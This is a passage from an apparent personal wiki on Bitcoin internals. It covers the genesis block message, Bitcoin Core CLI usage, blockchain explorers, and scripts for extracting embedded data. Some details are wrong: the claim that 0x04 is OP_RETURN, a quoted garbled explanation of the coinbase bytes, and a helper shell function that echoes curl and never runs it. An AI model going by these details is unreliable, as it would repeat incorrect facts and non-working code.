  - [https://www.blockchain.com/explorer/transactions/btc/b611aad6303c2c68a24ff15f95a3ddd2b062cd0f50d6177571e03b4ef4ab2c9f](https://www.blockchain.com/explorer/transactions/btc/b611aad6303c2c68a24ff15f95a3ddd2b062cd0f50d6177571e03b4ef4ab2c9f)
  - [https://www.blockchain.com/explorer/transactions/btc/e943cb2bf071b8448e03434df806be59725b996c64105eda54a283271baedf95](https://www.blockchain.com/explorer/transactions/btc/e943cb2bf071b8448e03434df806be59725b996c64105eda54a283271baedf95)
  - [https://www.blockchain.com/explorer/transactions/btc/0f79422d315cda1cef604a46f6a20b85388fda97f21d7e6f4f862f8959d7d6f8](https://www.blockchain.com/explorer/transactions/btc/0f79422d315cda1cef604a46f6a20b85388fda97f21d7e6f4f862f8959d7d6f8)
  - [https://www.blockchain.com/explorer/transactions/btc/42929388285a451b193eaae2ac809dac58fc09505cbc7bf8e4c109f95347f174](https://www.blockchain.com/explorer/transactions/btc/42929388285a451b193eaae2ac809dac58fc09505cbc7bf8e4c109f95347f174)
  - [https://www.blockchain.com/explorer/transactions/btc/78cfc7c50f66869b5240e6c836cc460ebd9f0db426cd61c0eab2a5ed5425c4a9](https://www.blockchain.com/explorer/transactions/btc/78cfc7c50f66869b5240e6c836cc460ebd9f0db426cd61c0eab2a5ed5425c4a9)
  - [https://www.blockchain.com/explorer/transactions/btc/078ad0362c6f3de0ca746e0e63008c82f49399744504130e7fae9d3d9ffed3d0](https://www.blockchain.com/explorer/transactions/btc/078ad0362c6f3de0ca746e0e63008c82f49399744504130e7fae9d3d9ffed3d0)
  - [https://www.blockchain.com/explorer/transactions/btc/4f91f3fe20492183ee7fa377199f2e591f7b5206efab27da7bff660c973907e6](https://www.blockchain.com/explorer/transactions/btc/4f91f3fe20492183ee7fa377199f2e591f7b5206efab27da7bff660c973907e6)
  - [https://www.blockchain.com/explorer/transactions/btc/92eef0f0a860e295001d0b4fbdcd5ffb49b60f08bd3a54215da9cfc67fd9d9e5](https://www.blockchain.com/explorer/transactions/btc/92eef0f0a860e295001d0b4fbdcd5ffb49b60f08bd3a54215da9cfc67fd9d9e5)
  - [https://www.blockchain.com/explorer/transactions/btc/c33211ce2373915fb9933d18d306b45be12025369d9f28c602918c83079812de](https://www.blockchain.com/explorer/transactions/btc/c33211ce2373915fb9933d18d306b45be12025369d9f28c602918c83079812de)
  - [https://www.blockchain.com/explorer/transactions/btc/fcd2f712070a895f6a92d5913a3341bcbc15e12a72c3ec44af246291c5ba1d3b](https://www.blockchain.com/explorer/transactions/btc/fcd2f712070a895f6a92d5913a3341bcbc15e12a72c3ec44af246291c5ba1d3b)
  - [https://www.blockchain.com/explorer/transactions/btc/ff1e97994fb9db72d4d4f9b4ee254d9517e8f562d16f287eefd0e93647554e61](https://www.blockchain.com/explorer/transactions/btc/ff1e97994fb9db72d4d4f9b4ee254d9517e8f562d16f287eefd0e93647554e61)
  - [tx 9a52c6325380ef34fe1e4d03202331a3937fbe420c79d7dc0f002027a9507e0f](https://www.blockchain.com/explorer/transactions/btc/9a52c6325380ef34fe1e4d03202331a3937fbe420c79d7dc0f002027a9507e0f) block 137303 (2011-07-21). No spends. Mentioned at: [https://bitcointalk.org/index.php?topic=84569.msg992950#msg992950](https://bitcointalk.org/index.php?topic=84569.msg992950#msg992950) 
- [tx c07c4437cee1fa86bffcc188e40a11300de5b247f90293d64c5d15a14dd88989](https://www.blockchain.com/explorer/transactions/btc/c07c4437cee1fa86bffcc188e40a11300de5b247f90293d64c5d15a14dd88989) block 136884 (2011-07-20) has 100+ 8-character vanity address, but unlike the other pools it actually spends all of them, possibly to prove that they are spendable

###### List of Bitcoin addresses

↑ **Parent:** [Bitcoin address](#bitcoin-address)

###### 1MVpQJA7FtcDrwKC6zATkZvZcxqma4JixS

↑ **Parent:** [List of Bitcoin addresses](#list-of-bitcoin-addresses)

The fee/change address of [cryptograffiti.info](cool-data-embedded-in-the-bitcoin-blockchain.md#cryptograffiti-info).

###### Coinbase transaction

↑ **Parent:** [Bitcoin transaction](#bitcoin-transaction)

The first transaction of each [Bitcoin block](#bitcoin-block) is called the "coinbase transaction", and it is magic as it does not need to point to a previous [output script](#bitcoin-output-script) and have a valid [input script](#bitcoin-input-script) as it serves as a [Block reward](#block-reward) for [miners](#cryptocurrency-mining).

###### Coinbase message

↑ **Parent:** [Coinbase transaction](#coinbase-transaction)  
🏷️ **Tags:** [Bitcoin inscription method](#bitcoin-inscription-method), [Miner message](social-technology.md#miner-message)

The [input script](#bitcoin-input-script) of the [Coinbase transaction](#coinbase-transaction) can be anything, and this can be used as a [Bitcoin inscription method](#bitcoin-inscription-method).

Notable examples:
- [Genesis block message](#genesis-block-message)
- Prayer side of the [Prayer wars](cool-data-embedded-in-the-bitcoin-blockchain.md#prayer-wars)

##### Bitcoin block

↑ **Parent:** [Bitcoin protocol](#bitcoin-protocol)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Bitcoin_block)

###### List of bitcoin blocks

↑ **Parent:** [Bitcoin block](#bitcoin-block)

###### Genesis block

↑ **Parent:** [List of bitcoin blocks](#list-of-bitcoin-blocks)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Genesis_block)

- [https://www.blockchain.com/explorer/blocks/btc/0](https://www.blockchain.com/explorer/blocks/btc/0)
- [https://blockchain.info/block-height/0?format=json](https://blockchain.info/block-height/0?format=json)
- [https://en.bitcoin.it/wiki/Genesis_block](https://en.bitcoin.it/wiki/Genesis_block) contains some comments on the data.

###### Genesis block message

↑ **Parent:** [Genesis block](#genesis-block)  
🏷️ **Tags:** [Coinbase message](#coinbase-message)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Genesis_block_message)

[Inscription](social-technology.md#inscription-blockchain) added by [Satoshi Nakamoto](#satoshi-nakamoto) on the [Genesis block](#genesis-block) containing:

> The Times 03/Jan/2009 Chancellor on brink of second bailout for banks 

which is a reference to: [https://www.thetimes.co.uk/article/chancellor-alistair-darling-on-brink-of-second-bailout-for-banks-n9l382mn62h](https://www.thetimes.co.uk/article/chancellor-alistair-darling-on-brink-of-second-bailout-for-banks-n9l382mn62h) wihch is fully titled:

> Chancellor Alistair Darling on brink of second bailout for banks

The "Alistair" was slikely removed due to limited payload concerns.

Through the newspaper reference, the message proves a minimal starting date for the first mine.

And it hints that one of [Bitcoin](#bitcoin)'s motivation was the [financial crisis of 2007-2008](economy.md#financial-crisis-of-2007-2008), where banks were given bailouts by the government to not go under, which many people opposed as the crisis was their own fault in the first place. A notable related stab is taken at [Len Sassaman tribute](cool-data-embedded-in-the-bitcoin-blockchain.md#len-sassaman-tribute).

We can extract the image from the blockchain ourselves by starting from: [https://blockchain.info/block-height/0?format=json](https://blockchain.info/block-height/0?format=json).

From that page we manually extract the hash `000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f` and then:
```
wget -O 0.hex https://blockchain.info/block/000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f?format=hex
xxd -p -r 0.hex
```
and that does contain the famous genesis block string:
```
EThe Times 03/Jan/2009 Chancellor on brink of second bailout for banks
```
The JSON clarifies that the data is encoded in the `script` field of the transaction `input`:
```
{
      {
         "script":"04ffff001d0104455468652054696d65732030332f4a616e2f32303039204368616e63656c6c6f72206f6e206272696e6b206f66207365636f6e64206261696c6f757420666f722062616e6b73"
```

The extra `E` (0x45 in [ASCII](telecommunication.md#ascii)) in `EThe Times` is just extra noise required by the script, we can break things up as:
```
04ffff001d0104 45 5468652054696d65732030332f4a616e2f32303039204368616e63656c6c6f72206f6e206272696e6b206f66207365636f6e64206261696c6f757420666f722062616e6b73
```
where:
- `54` is `T`
- the `04ffff001d0104` part just doesn't show up on the terminal because it is not made of any printable characters.

The initial `04` is `OP_RETURN`.

TODO what is actual the meaning of the `ffff001d010445` part? `@defango` [https://twitter.com/defango/status/1642750851134652417](https://twitter.com/defango/status/1642750851134652417) comments:

> 04ffff001d0104 is a hexadecimal string. It is commonly used in the Bitcoin network as a part of the mining process. Specifically, it is used as the target value for a block to be considered valid by the Bitcoin network.
> 
> This value represents the level of difficulty required for a miner to generate a block that meets the network's criteria. The first four bytes, 04ffff, represent the maximum possible target value. The next three bytes, 001d01, represent the current difficulty level
> 
> while the final byte, 04, is a padding byte. In summary, this value sets the difficulty level for mining a new block in the Bitcoin network.

TODO the `output` of the transaction has a jumbled script, likely just a regular output to get things going, can't be arbitrary like input.

###### Satoshi tribute

↑ **Parent:** [Genesis block](#genesis-block)

![](https://web.archive.org/web/20230214064329if_/https://miro.medium.com/v2/resize:fit:640/format:webp/1%2ABPzmT_vGzBiC1oAq0Fnvgw.jpeg)

**[Figure 11](#_614)** [Source](https://medium.com/@chain.info1/the-mystery-behind-satoshi-tribute-donations-cf4ce28c56a1).

- [https://medium.com/@chain.info1/the-mystery-behind-satoshi-tribute-donations-cf4ce28c56a1](https://medium.com/@chain.info1/the-mystery-behind-satoshi-tribute-donations-cf4ce28c56a1) The Mystery Behind "Satoshi Tribute" Donations by Chain.Info (2020)

###### First block not mined by Satoshi

↑ **Parent:** [List of bitcoin blocks](#list-of-bitcoin-blocks)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/First_block_not_mined_by_Satoshi)

[https://www.blockchain.com/explorer/blocks/btc/78](https://www.blockchain.com/explorer/blocks/btc/78)

#### Bitcoin implementation

↑ **Parent:** [Bitcoin](#bitcoin)

##### Bitcoin blockchain parser

↑ **Parent:** [Bitcoin implementation](#bitcoin-implementation)

This section is about partial implementations that are only able to read the blocks, ususally coming from [Bitcoin Core](#bitcoin-core), to interpret the data:
- [https://bitcoin.stackexchange.com/questions/22500/is-there-a-lightweight-blockchain-parser-library-server](https://bitcoin.stackexchange.com/questions/22500/is-there-a-lightweight-blockchain-parser-library-server)

###### python-bitcoin-blockchain-parser

↑ **Parent:** [Bitcoin blockchain parser](#bitcoin-blockchain-parser)

[https://github.com/alecalve/python-bitcoin-blockchain-parser](https://github.com/alecalve/python-bitcoin-blockchain-parser)

Is it mega fast? Nope

Does it work? Yup.

Used on [Bitcoin Inscription Indexer](#bitcoin-inscription-indexer) for [Ciro's Bitcoin Inscription Museum](cool-data-embedded-in-the-bitcoin-blockchain.md).

##### Bitcoin Core

↑ **Parent:** [Bitcoin implementation](#bitcoin-implementation)

Reference implementation?

Links:
- [https://github.com/bitcoin/bitcoin](https://github.com/bitcoin/bitcoin)
- [https://bitcoin.org](https://bitcoin.org)

Executables provided:
- `bitcoin-qt`

###### Bitcoin Core executable

↑ **Parent:** [Bitcoin Core](#bitcoin-core)

###### Bitcoin daemon

↑ **Parent:** [Bitcoin Core executable](#bitcoin-core-executable)

Runs just a headless Bitcoin server.

You can then interact with it via the [Bitcoin CLI client](#bitcoin-cli-client).

On [Bitcoin Core snap](#bitcoin-core-snap) 26.0, the executable is called `bitcoin-core.daemon` rather than `bitcoind`

###### Bitcoin RPC command

↑ **Parent:** [Bitcoin daemon](#bitcoin-daemon)

These are commands that e.g. the [Bitcoin CLI client](#bitcoin-cli-client) can make to the server.

[https://bitcoincore.org/en/doc/22.0.0/rpc/rawtransactions/getrawtransaction/](https://bitcoincore.org/en/doc/22.0.0/rpc/rawtransactions/getrawtransaction/)

The commands can be listed with:
```
bitcoin-core.cli help
```
and full help with:
```
bitcoin-core.cli help getrawtransaction
```

For example. to run the [Bitcoin `getrawtransaction` command](#bitcoin-getrawtransaction-command), first in one shell we start [bitcoind](#bitcoin-daemon):
```
bitcoin-core.daemon
```
and then on another shell:
```
bitcoin-core.cli getrawtransaction 75b431e0a8c4617ca8adefe593ba66aa30907742b6dc8772761bfe7edabd74b4 true
```

###### Bitcoin `getrawtransaction` command

↑ **Parent:** [Bitcoin RPC command](#bitcoin-rpc-command)

###### Bitcoin CLI client

↑ **Parent:** [Bitcoin Core executable](#bitcoin-core-executable)  
🏷️ **Tags:** [Command line utility](software.md#command-line-utility)

On [Bitcoin Core snap](#bitcoin-core-snap) 26.0, the executable is called `bitcoin-core.cli` rather than `bitcoin-cli`.

###### Bitcoin Core snap

↑ **Parent:** [Bitcoin Core executable](#bitcoin-core-executable)

Officially supported installation method on [Ubuntu 23.10](systems-programming.md#ubuntu-23-10).

###### Bitcoin Core data layout

↑ **Parent:** [Bitcoin Core executable](#bitcoin-core-executable)

Bibliography:
- [https://bitcoindev.network/understanding-the-data/](https://bitcoindev.network/understanding-the-data/)

###### Bitcoin Core txindex

↑ **Parent:** [Bitcoin Core data layout](#bitcoin-core-data-layout)

TODO format???
- [https://bitcoin.stackexchange.com/questions/121888/what-is-the-data-format-layout-for-txindex-leveldb-values](https://bitcoin.stackexchange.com/questions/121888/what-is-the-data-format-layout-for-txindex-leveldb-values)
- [https://bitcointalk.org/index.php?topic=1068721.0](https://bitcointalk.org/index.php?topic=1068721.0)

#### How to store data in the Bitcoin blockchain

↑ **Parent:** [Bitcoin](#bitcoin)

There are apparently two methods:
- in the script, e.g. as in the [Genesis block message](#genesis-block-message)
- in output addresses

Specific implementations:
- [http://eternitywall.it/](http://eternitywall.it/) Eternity Wall

  Launched 2015 [https://www.newsbtc.com/news/bitcoin/eternity-wall-records-1150-documents-blockchain-first-year/](https://www.newsbtc.com/news/bitcoin/eternity-wall-records-1150-documents-blockchain-first-year/)

  TODO find sample transactions. Did it support images?

  Shutdown sometime after 2019, working archive: [https://web.archive.org/web/20190417074034/https://eternitywall.it/](https://web.archive.org/web/20190417074034/https://eternitywall.it/) says "Sorry, the service is not properly working at the moment..." and last working message timestamped "April 16, 2019 8:02 PM GMT".

Bibliography:
- [https://bitcoin.stackexchange.com/questions/32575/what-methods-are-currently-used-to-embed-additional-data-into-the-bitcoin-blockc](https://bitcoin.stackexchange.com/questions/32575/what-methods-are-currently-used-to-embed-additional-data-into-the-bitcoin-blockc)
- [https://bitcoin.stackexchange.com/questions/39347/how-to-store-data-on-the-blockchain](https://bitcoin.stackexchange.com/questions/39347/how-to-store-data-on-the-blockchain)

#### How to extract data from the Bitcoin blockchain

↑ **Parent:** [Bitcoin](#bitcoin)

TODO: it would be cool to have something like [https://bitcoinstrings.com](https://bitcoinstrings.com) but including the actual transactions:

Local methods:
- [Bitcoin Inscription Indexer](#bitcoin-inscription-indexer)
- [https://bitcoin.stackexchange.com/questions/30295/how-can-i-search-for-transaction-text-on-the-blockchain](https://bitcoin.stackexchange.com/questions/30295/how-can-i-search-for-transaction-text-on-the-blockchain)
- [https://bitcoin.stackexchange.com/questions/22500/is-there-a-lightweight-blockchain-parser-library-server/101472#101472](https://bitcoin.stackexchange.com/questions/22500/is-there-a-lightweight-blockchain-parser-library-server/101472#101472)
- [https://github.com/alecalve/python-bitcoin-blockchain-parser](https://github.com/alecalve/python-bitcoin-blockchain-parser)
- [https://bitcoin.stackexchange.com/questions/84266/wondering-how-to-use-bitcoin-parser](https://bitcoin.stackexchange.com/questions/84266/wondering-how-to-use-bitcoin-parser)
- [https://github.com/bitcoinprivacy/Bitcoin-Graph-Explorer](https://github.com/bitcoinprivacy/Bitcoin-Graph-Explorer) stores the blockchain in a database, and should allow more intelligent querying.

Further bibliography:
- [https://bitcoin.stackexchange.com/questions/799/can-i-download-the-whole-block-chain-from-somewhere](https://bitcoin.stackexchange.com/questions/799/can-i-download-the-whole-block-chain-from-somewhere)
- [https://bitcoin.stackexchange.com/questions/68925/how-can-data-be-accessed-searched-for-in-a-blockchain](https://bitcoin.stackexchange.com/questions/68925/how-can-data-be-accessed-searched-for-in-a-blockchain)
- [https://bitcoin.stackexchange.com/questions/55188/download-single-and-specific-block-for-study-purposes](https://bitcoin.stackexchange.com/questions/55188/download-single-and-specific-block-for-study-purposes)
- [https://www.fiverr.com/usefulshine/embed-your-logo-or-brand-art-on-blockchain](https://www.fiverr.com/usefulshine/embed-your-logo-or-brand-art-on-blockchain) user usefulshine from India embeds ASCII art for you into the blockchain starting at 260 dollars! XD

##### Blockchain explorer

↑ **Parent:** [How to extract data from the Bitcoin blockchain](#how-to-extract-data-from-the-bitcoin-blockchain)

###### Blockchain SQL explorer

↑ **Parent:** [Blockchain explorer](#blockchain-explorer)

- [https://bitcoin.stackexchange.com/questions/11687/reliable-efficient-way-to-parse-the-blockchain-into-a-sql-database](https://bitcoin.stackexchange.com/questions/11687/reliable-efficient-way-to-parse-the-blockchain-into-a-sql-database)
- [https://bitcoin.stackexchange.com/questions/93080/what-is-the-currently-most-efficient-and-reliable-method-to-store-the-bitcoin-bl?noredirect=1&lq=1](https://bitcoin.stackexchange.com/questions/93080/what-is-the-currently-most-efficient-and-reliable-method-to-store-the-bitcoin-bl?noredirect=1&lq=1)
- [https://www.reddit.com/r/Bitcoin/comments/6wcbbs/recent_blockchain_sql_dumps/](https://www.reddit.com/r/Bitcoin/comments/6wcbbs/recent_blockchain_sql_dumps/)
- [https://bitcointalk.org/index.php?topic=5464721.0](https://bitcointalk.org/index.php?topic=5464721.0)

Cloud options:
- [Google BigQuery](google.md#google-bigquery): [https://cloud.google.com/blog/topics/public-datasets/bitcoin-in-bigquery-blockchain-analytics-on-public-data](https://cloud.google.com/blog/topics/public-datasets/bitcoin-in-bigquery-blockchain-analytics-on-public-data) Sample query to get all addresses ever:
  ```
  SELECT block_number, transaction_hash, index, type, addresses, value
  FROM `bigquery-public-data.crypto_bitcoin.outputs`
  ORDER BY block_number ASC, transaction_hash ASC, index ASC, index ASC
  LIMIT 100
  ```

  First output lines:
  ```
  block_number,transaction_hash,index,type,addresses,value
  0,4a5e1e4baab89f3a32518a88c31bc87f618f76673e2cc77ab2127b7afdeda33b,0,pubkey,[1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa],5000000000
  1,0e3e2357e806b6cdb1f70b54c3a3a17b6714ee1f0e68bebb44a74b1efd512098,0,pubkey,[12c6DSiU4Rq3P4ZxziKxzrL5LmMBrzjrJX],5000000000
  2,9b0fc92260312ce44e74ef369f5c66bbb85848f2eddd5a7a1cde251e54ccfdd5,0,pubkey,[1HLoD9E4SDFFPDiYfNYnkBLQ85Y51J3Zb1],5000000000
  ```
- [Amazon Athena](computer-hardware.md#amazon-athena): [https://aws.amazon.com/blogs/web3/access-bitcoin-and-ethereum-open-datasets-for-cross-chain-analytics/](https://aws.amazon.com/blogs/web3/access-bitcoin-and-ethereum-open-datasets-for-cross-chain-analytics/)

###### Blockchain explorer website

↑ **Parent:** [Blockchain explorer](#blockchain-explorer)

###### Blockchair

↑ **Parent:** [Blockchain explorer website](#blockchain-explorer-website)

[https://blockchair.com/](https://blockchair.com/)

Very good explorer, you can create several complex queries on it e.g.
- [https://bitcoin.stackexchange.com/questions/121718/fnd-the-most-valuable-transactions-made-to-a-given-address/121719#121719](https://bitcoin.stackexchange.com/questions/121718/fnd-the-most-valuable-transactions-made-to-a-given-address/121719#121719)
- [https://bitcoin.stackexchange.com/questions/71019/filter-transactions-by-time-on-a-given-address/121720#121720](https://bitcoin.stackexchange.com/questions/71019/filter-transactions-by-time-on-a-given-address/121720#121720)

Unfrotunately their API became paid only circa 2025...

<h6 id="blockchain-info">Blockchain.info</h6>

↑ **Parent:** [Blockchain explorer website](#blockchain-explorer-website)

TODO who owns it? Are they reliable?

- transaction hex data: [https://blockchain.info/tx/930a2114cdaa86e1fac46d15c74e81c09eee1d4150ff9d48e76cb0697d8e1d72?format=hex](https://blockchain.info/tx/930a2114cdaa86e1fac46d15c74e81c09eee1d4150ff9d48e76cb0697d8e1d72?format=hex)
- disassembled transaction as JSON: [https://blockchain.info/tx/930a2114cdaa86e1fac46d15c74e81c09eee1d4150ff9d48e76cb0697d8e1d72?format=json](https://blockchain.info/tx/930a2114cdaa86e1fac46d15c74e81c09eee1d4150ff9d48e76cb0697d8e1d72?format=json)
- block by height:
  - [https://blockchain.info/block/0?format=json](https://blockchain.info/block/0?format=json)
  - [https://blockchain.info/block/0?format=hex](https://blockchain.info/block/0?format=hex)

This helper dumps a transaction JSON to a binary:
```
bitcoin-tx-out-scripts() (
    # Dump data contained in out scripts. Remove first 3 last 2 bytes of
    # standard transaction boilerplate.
    h="$1"
    echo curl "https://blockchain.info/tx/${h}?format=json" |
    jq '.out[].script' tmp.json |
    sed 's/"76a914//;s/88ac"//' |
    xxd -r -p > "${h}.bin"
)
```

Their API limit witout key is 1 query per 10 seconds!!!

##### Bitcoin Inscription Indexer

↑ **Parent:** [How to extract data from the Bitcoin blockchain](#how-to-extract-data-from-the-bitcoin-blockchain)

[https://github.com/cirosantilli/bitcoin-inscription-indexer](https://github.com/cirosantilli/bitcoin-inscription-indexer)

Previously called "bitcoin-strings-with-txids" since text was the initial focus, but [Ciro Santilli](ciro-santilli.md) decided to go for the more general name once images became more and more important to the project.

Set of scripts b [Ciro Santilli](ciro-santilli.md), primarily created while researching [Cool data embedded in the Bitcoin blockchain](cool-data-embedded-in-the-bitcoin-blockchain.md).

<h5 id="bitcoinstrings-com">BitcoinStrings.com</h5>

↑ **Parent:** [How to extract data from the Bitcoin blockchain](#how-to-extract-data-from-the-bitcoin-blockchain)

[https://bitcoinstrings.com](https://bitcoinstrings.com) has all `strings -n20` strings, we can obtain the whole thing and clean it up a bit with:
```
wget -O all.html https://bitcoinstrings.com/all
cp all.html all-recode.html
recode html..ascii all-recode.html
awk '!seen[$0]++' all-recode.html > all-uniq.html
```
`awk` to skip the gazillion "mined by message" repeats.

A lot of in that website stuff appears to be cut up at the 20 mark. As shown in [Force of Will](cool-data-embedded-in-the-bitcoin-blockchain.md#force-of-will), this is possibly because they didn't use `-w` in `strings -n20`, and the text after the newlines was less than 20 characters.

That website can be replicated by downloading the [Bitcoin](#bitcoin) blockchain locally, then:
```
cd .bitcoin/blocks
for f in blk*.dat; do strings -n20 -w $f | awk '!seen[$0]++' > ${f%.dat}.txt; done
tail +n1 *.txt
```

Remove most of the binary crap:
```
head -n-1 *.txt | grep -e '[. ]' | grep -iv 'mined by' | less
```

##### Satoshi uploader

↑ **Parent:** [How to extract data from the Bitcoin blockchain](#how-to-extract-data-from-the-bitcoin-blockchain)  
🏷️ **Tags:** [P2FMS](#pay-to-fake-multisig)

See also: [https://bitcoin.stackexchange.com/questions/35959/how-is-the-whitepaper-decoded-from-the-blockchain-tx-with-1000x-m-of-n-multisi/105574#105574](https://bitcoin.stackexchange.com/questions/35959/how-is-the-whitepaper-decoded-from-the-blockchain-tx-with-1000x-m-of-n-multisi/105574#105574)

By "Satoshi uploader" we mean the data upload script present in tx [4b72a223007eab8a951d43edc171befeabc7b5dca4213770c88e09ba5b936e17](https://www.blockchain.com/btc/tx/4b72a223007eab8a951d43edc171befeabc7b5dca4213770c88e09ba5b936e17) of the [Bitcoin blockchain](#bitcoin).

The uploader, and its accompanying downloader, are [Python](programming-language.md#python-programming-language) programs stored in the blockchain itself. They are made to upload and download arbitrary data into the blockchain via RPC.

These scripts were notably used for: [illegal content of block 229k](cool-data-embedded-in-the-bitcoin-blockchain.md#illegal-content-of-block-229k). The script did not maintain its popularity much after this initial surge up loads, likely all done by the same user: there are very very few uploads done after block 229k with the Satoshi uploader.

Our choice of name as "Satoshi uploader" is copied from [A Quantitative Analysis of the Impact of Arbitrary Blockchain Content on Bitcoin by Matzutt et al. (2018)](cool-data-embedded-in-the-bitcoin-blockchain.md#a-quantitative-analysis-of-the-impact-of-arbitrary-blockchain-content-on-bitcoin-by-matzutt-et-al-2018) because the scripts are Copyrighted Satoshi Nakamoto on the header comment, although as mentioned at [Hidden surprises in the Bitcoin blockchain by Ken Shirriff (2014)](cool-data-embedded-in-the-bitcoin-blockchain.md#hidden-surprises-in-the-bitcoin-blockchain-by-ken-shirriff-2014) this feels very unlikely to be true.

A more convenient version of those scripts that can download directly from [blockchain.info](#blockchain-info) without the need for a full local node can be found at: [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/download_tx_consts.py](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/download_tx_consts.py) by using the `--satoshi` option. E.g. with it you can download the uploader script with:
```
./download_tx_consts.py --satoshi 4b72a223007eab8a951d43edc171befeabc7b5dca4213770c88e09ba5b936e17
mv 4b72a223007eab8a951d43edc171befeabc7b5dca4213770c88e09ba5b936e17.bin uploader.py
```

The scripts can be found in the blockchain at:
- uploader: tx 4b72a223007eab8a951d43edc171befeabc7b5dca4213770c88e09ba5b936e17 block 229991 reproduced at: [https://gist.github.com/cirosantilli/ade4dde7c2f2f5020d792872681763e8](https://gist.github.com/cirosantilli/ade4dde7c2f2f5020d792872681763e8)

  The uploader [creates a standard Pay-to-PubkeyHash transaction](https://gist.github.com/cirosantilli/ade4dde7c2f2f5020d792872681763e8#file-bitcoin-insertion-tool-py-L161) with a single output and data as a fake pubkey hash, and sends change to an address specified on the command line:
  ```
  ./bitcoinInsertionTool.py <data> <change-addr>
  ```
- downloader: tx 6c53cd987119ef797d5adccd76241247988a0a5ef783572a9972e7371c5fb0cc block 229991 reproduced at [https://gist.github.com/cirosantilli/e90bd2e6c3fab25a20898e61e3ab3e90](https://gist.github.com/cirosantilli/e90bd2e6c3fab25a20898e61e3ab3e90)

  The downloader just [strips all operands](https://gist.github.com/shirriff/64f48fa09a61b56ffcf9#file-bitcoin-file-downloader-py-L32), and keeps all data, notably where public key hashes would be normally put.

The uploader script uses its own cumbersome data encoding format, which we call the "Satoshi uploader format". The is as follows:
- ignore all script operands and constants less than 20 bytes (40 hex characters). And there are a lot of small operands, e.g. the uploader itself uses format [https://www.blockchain.com/btc/tx/4b72a223007eab8a951d43edc171befeabc7b5dca4213770c88e09ba5b936e17](https://www.blockchain.com/btc/tx/4b72a223007eab8a951d43edc171befeabc7b5dca4213770c88e09ba5b936e17) has a `OP_1`, data, `OP_3`, `OP_CHECKMULTISIG` pattern on every output script, so the `OP_1` and `OP_3` are ignored. I.e., it is [P2FMS](#pay-to-fake-multisig).
- ignore the last output, which contains a real change transaction instead of arbitrary data. TODO why not just do what with the length instead?
- the first 4 bytes are the payload length, the next 4 bytes a [CRC-32](technology.md#crc-32) signature. The payload length is in particular useful because of possible granularity of transactions. But it is hard to understand why a CRC-32 is needed in the middle of the largest [hash tree](computer-science.md#merkle-tree) ever created by human kind!!! It does however have the adavantage that it allows us to more uniquely identify which transactions use the format or not.
This means that if we want to index certain file types encoded in this format, a good heuristic is to skip the first 9 bytes (4 size, 4 CRC, 1 `OP_1`) and look for file signatures.

Let's try out the downloader to download itself. First you have to be running a [Bitcoin Core](#bitcoin-core) server locally. Then, supposing `.bitcon/bitoin.conf` containing:
```
rpcuser=asdf
rpcpassword=qwer
server=1
txindex=1
```
we run:
```
git clone git://github.com/jgarzik/python-bitcoinrpc.git
git -C python-bitcoinrpc checkout cdf43b41f982b4f811cd4ebfbc787ab2abf5c94a
wget https://gist.githubusercontent.com/shirriff/64f48fa09a61b56ffcf9/raw/ad1d2e041edc0fb7ef23402e64eeb92c045b5ef7/bitcoin-file-downloader.py
pip install python-bitcoinrpc==1.0
BTCRPCURL=http://asdf:qwer@127.0.0.1:8332 \
  PYTHONPATH="$(pwd)/python-bitcoinrpc:$PYTHONPATH" \
  python3 bitcoin-file-downloader.py \
  6c53cd987119ef797d5adccd76241247988a0a5ef783572a9972e7371c5fb0cc
```
worked! The source of the downloader script is visible! Note that we had to wait for the sync of the entire blockchain to be fully finished for some reason for that to work.

Other known uploads in Satoshi format except from the first few:
- tx 89248ecadd51ada613cf8bdf46c174c57842e51de4f99f4bbd8b8b34d3cb7792 block 344068 see [ASCII art](art.md#ascii-art)
- tx 1ff17021495e4afb27f2f55cc1ef487c48e33bd5a472a4a68c56a84fc38871ec contains the ASCII text `e5a6f30ff7d43f96f61af05efaf96f869aa072b5a071f32a24b03702d1dcd2a6`. This number however is not a known transaction ID in the blockchain, and has no Google hits.

<h6 id="peter-todd-s-data-upload-scripts">Peter Todd's data upload scripts</h6>

↑ **Parent:** [Satoshi uploader](#satoshi-uploader)  
🏷️ **Tags:** [Peter Todd](#peter-todd)

[tx 243dea31863e94dc2f293489db02452e9bde279df1ab7feb6e456a4af672156a](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0349.txt#L1930) contains another upload script. The help reads:

> Publish text in the blockchain, suitably padded for easy recovery with strings

The script is: [https://github.com/petertodd/python-bitcoinlib/blob/master/examples/publish-text.py](https://github.com/petertodd/python-bitcoinlib/blob/master/examples/publish-text.py)

##### Bitcoin blockchain `j(` upload system

↑ **Parent:** [How to extract data from the Bitcoin blockchain](#how-to-extract-data-from-the-bitcoin-blockchain)

This is likely a system that uploads text to the blockchain.

One example can be seen on the [Marijuana plant](cool-data-embedded-in-the-bitcoin-blockchain.md#marijuana-plant).

Messages are uploaded one line per transaction, and thus may be cut up on the blk.txt, and possibly even out of order.

But because each line starts with `j(` you can generally piece things up regardless.

TODO identify. The first occurrence seems to be in tx e8c61e29c6b829e289f8d0fc95f9eb2eb00c89c85cfa3a9c700b15805451ae6a:
```
j(DOCPROOF@?pnvf=!;AG
```

#### Services based on Bitcoin

↑ **Parent:** [Bitcoin](#bitcoin)

##### Satoshi Dice

↑ **Parent:** [Services based on Bitcoin](#services-based-on-bitcoin)

[https://en.bitcoin.it/wiki/Satoshi_Dice](https://en.bitcoin.it/wiki/Satoshi_Dice)

Claims provably fair. [https://satoshidice.com/fair](https://satoshidice.com/fair) clarifies what that means: they prove fairness by releasing a hash of the seed before the bets, and the actual seed after the bets.

As mentioned in bitcoin.it, it functions basically as [cryptocurrency tumbler](#cryptocurrency-tumbler) in practice.

#### Bitcoin inscription

↑ **Parent:** [Bitcoin](#bitcoin)  
🏷️ **Tags:** [Inscription (blockchain)](social-technology.md#inscription-blockchain)

##### Cool data embedded in the Bitcoin blockchain

↑ **Parent:** [Bitcoin inscription](#bitcoin-inscription)

